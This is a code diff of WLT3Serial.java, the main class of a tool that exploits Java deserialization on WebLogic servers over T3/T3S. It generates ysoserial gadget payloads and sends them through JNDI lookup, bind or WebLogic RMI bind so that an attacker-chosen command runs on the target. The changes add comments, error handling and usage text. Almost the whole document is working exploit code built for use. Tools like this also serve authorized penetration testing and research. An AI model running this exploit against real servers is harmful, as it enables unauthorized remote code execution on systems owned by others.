@@ -1,10 +1,9 @@
 /*
-
-Options:
-
-SSL
-exploit-type
-
+	WLT3Serial.java
+	
+	v0.1 (11/25/2017)
+	
+	Main class for executing java deserialization exploit against WebLogic Servers hosting a T3 or T3S listener. Parses command options then executes exploit with those options.
 */
 
 package bort.millipede.wlt3;
@@ -21,7 +20,7 @@ import ysoserial.payloads.util.Gadgets;
 
 public class WLT3Serial {
 	public static void main(String[] args) throws Exception {
-		if(args.length<4) {
+		if(args.length<4) { //check number of arguments, print Usage if short
 			usage();
 			return;
 		}
@@ -41,11 +40,11 @@ public class WLT3Serial {
 		String method = "Property";
 		boolean verbose = false;
 		
-		//parse OPTIONS from command-line
+		//parse options from command-line
 		if(args.length>4) {
 			int lastOpt = args.length-5;
-			boolean methSet = false;
-			boolean tlsSet = false;
+			boolean methSet = false; //if exploit method has been set
+			boolean tlsSet = false; //if T3S flag has been set
 			for(int i=0;i<=lastOpt;i++) {
 				String opt = args[i];
 				opt = opt.trim();
@@ -58,10 +57,10 @@ public class WLT3Serial {
 						case "--help": //print usage
 							usage();
 							return;
-						case "--verbose":
+						case "--verbose": //enable verbose output
 							verbose=true;
 							break;
-						case "--method=Property":
+						case "--method=Property": //set "Connect Property Value" exploit method
 							if(!methSet) {
 								method = "Property";
 								methSet = true;
@@ -71,7 +70,7 @@ public class WLT3Serial {
 								return;
 							}
 							break;
-						case "--method=Bind":
+						case "--method=Bind": //set "Bind object" exploit method
 							if(!methSet) {
 								method = "Bind";
 								methSet = true;
@@ -81,7 +80,7 @@ public class WLT3Serial {
 								return;
 							}
 							break;
-						case "--method=WLBind":
+						case "--method=WLBind": //set "WebLogic RMI Bind object" exploit method
 							if(!methSet) {
 								method = "WLBind";
 								methSet = true;
@@ -91,8 +90,8 @@ public class WLT3Serial {
 								return;
 							}
 							break;
-						case "--t3s":
-						case "--t3s=TLSv1.2":
+						case "--t3s": //use T3S connection
+						case "--t3s=TLSv1.2": //use T3S connect with TLSv1.2
 							if(!tlsSet) {
 								t3s = true;
 								System.setProperty("jdk.tls.client.protocols","TLSv1.2");
@@ -103,7 +102,7 @@ public class WLT3Serial {
 								return;
 							}
 							break;
-						case "--t3s=TLSv1.1":
+						case "--t3s=TLSv1.1": //use T3S connect with TLSv1.1
 							if(!tlsSet) {
 								t3s = true;
 								System.setProperty("jdk.tls.client.protocols","TLSv1.1");
@@ -114,7 +113,7 @@ public class WLT3Serial {
 								return;
 							}
 							break;
-						case "--t3s=TLSv1":
+						case "--t3s=TLSv1": //use T3S connect with TLSv1
 							if(!tlsSet) {
 								t3s = true;
 								System.setProperty("jdk.tls.client.protocols","TLSv1");
@@ -133,27 +132,42 @@ public class WLT3Serial {
 			}
 		}
 		
-		//check validity of inputted ysoserial payload type, and generate ysoserial payload
-		final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
-		if(payloadClass == null) {
-			System.err.println("Error: Invalid payload type \""+payloadType+"\"! Ensure that ysoserial jar file is in classpath, and check Usage (--help option) for available payload types!");
-			return;
-		}
-		final ObjectPayload payload = payloadClass.newInstance();
-		final Object object = payload.getObject(command);
+		try {		
+			//check validity of inputted ysoserial payload type, and generate ysoserial payload
+			final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
+			if(payloadClass == null) {
+				System.err.println("Error: Invalid payload type \""+payloadType+"\"! Ensure that ysoserial jar file is in classpath, and check Usage (--help option) for available payload types!");
+				return;
+			}
+			final ObjectPayload payload = payloadClass.newInstance();
+			final Object object = payload.getObject(command);
 		
-		//run exploit
-		System.out.print("Connecting to WebLogic Server at "+(t3s ? "t3s" : "t3" )+"://"+host+":"+Integer.toString(port)+": ... ");
-		switch(method) {
-			case "Property":
-				ContextExploit.runPropertyExploit(object,host,port,t3s,verbose);
-				break;
-			case "Bind":
-				ContextExploit.runBindExploit(object,host,port,t3s,verbose);
-				break;
-			case "WLBind":
-				WLNamingExploit.runWLBindExploit(object,host,port,t3s,verbose);
-				break;
+			//run exploit
+			System.out.print("\nConnecting to WebLogic Server at "+(t3s ? "t3s" : "t3" )+"://"+host+":"+Integer.toString(port)+": ... ");
+			switch(method) {
+				case "Property":
+					ContextExploit.runPropertyExploit(object,host,port,t3s,verbose);
+					break;
+				case "Bind":
+					ContextExploit.runBindExploit(object,host,port,t3s,verbose);
+					break;
+				case "WLBind":
+					WLNamingExploit.runWLBindExploit(object,host,port,t3s,verbose);
+					break;
+			}
+		} catch(NoClassDefFoundError ncdfe) {
+			String message = ncdfe.getMessage();
+			if(message.contains("ysoserial")) {
+				System.err.println("Error loading ysoserial library! Ensure that ysoserial jar file is in classpath, and check Usage (--help option) for available payload types!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
+			} else if(message.contains("weblogic")) {
+				System.out.println("\b\b\b\bfailed!");
+				System.err.println("Error loading wlthint3client! Ensure that wlthint3client.jar file is in class path!"+(verbose ? "" : "\nRe-run with --verbose option to see full error output!"));
+			}
+			
+			if(verbose) {
+				System.err.print("\n");
+				ncdfe.printStackTrace();
+			}
 		}
 	}
 	
@@ -162,16 +176,17 @@ public class WLT3Serial {
 		System.err.println("Usage: WLT3Serial [OPTIONS] REMOTE_HOST REMOTE_PORT PAYLOAD_TYPE PAYLOAD_CMD");
 		System.err.println("\nOptions:");
 		System.err.println("\t--help\t\t\t\tprint usage (you\'re lookin at it)\n");
-		System.err.println("\t--verbose\t\t\tVerbose output (including full thrown exceptions) (NOT YET IMPLEMENTED)\n");
+		System.err.println("\t--verbose\t\t\tVerbose output (full thrown exception output)\n");
 		System.err.println("\t--method=EXPLOIT_METHOD\t\tExploit Method for delivering generated ysoserial payload");
-		System.err.println("\t\tExploit Methods:\n\t\t\tProperty\tSend ysoserial payload as connection environment property value (Default, javax.naming.Context.lookup(), similar to JavaUnserializeExploits weblogic.py)");
+		System.err.println("\t\tExploit Methods:\n\t\t\tProperty\tSend ysoserial payload as connection environment property value (Default, via javax.naming.Context.lookup(), similar to JavaUnserializeExploits weblogic.py)");
 		System.err.println("\t\t\tBind\t\tSend ysoserial payload as object to bind to name (via javax.naming.Context.bind(), also similar to JavaUnserializeExploits weblogic.py)");
 		System.err.println("\t\t\tWLBind\t\tSend ysoserial payload as WebLogic RMI object to bind to name (via weblogic.rmi.Naming.bind(), similar to ysoserial.exploit.RMIRegistryExploit)\n");
 		System.err.println("\t--t3s[=PROTOCOL]\t\tUse T3S (transport-encrypted) connection (Disabled by default)");
 		System.err.println("\t\tProtocols:\n\t\t\tTLSv1.2 (Default)");
 		System.err.println("\t\t\tTLSv1.1\n\t\t\tTLSv1");
-		System.err.println("\t\t\t(Note: SSLv2 and SSLv3 are unsupported at this time.)\n\n");
+		System.err.println("\t\t\t(Note: SSLv2 and SSLv3 are unsupported.)\n\n");
 		
+		//list available ysoserial payload types, or print error on failure
 		System.err.println("Available Payload Types (WebLogic is usually vulnerable to \"CommonsCollectionsX\" types):");
 		try {
 			final List<Class<? extends ObjectPayload>> payloadClasses = new ArrayList<Class<? extends ObjectPayload>>(ObjectPayload.Utils.getPayloadClasses());
@@ -187,3 +202,4 @@ public class WLT3Serial {
 		}
 	}
 }
+
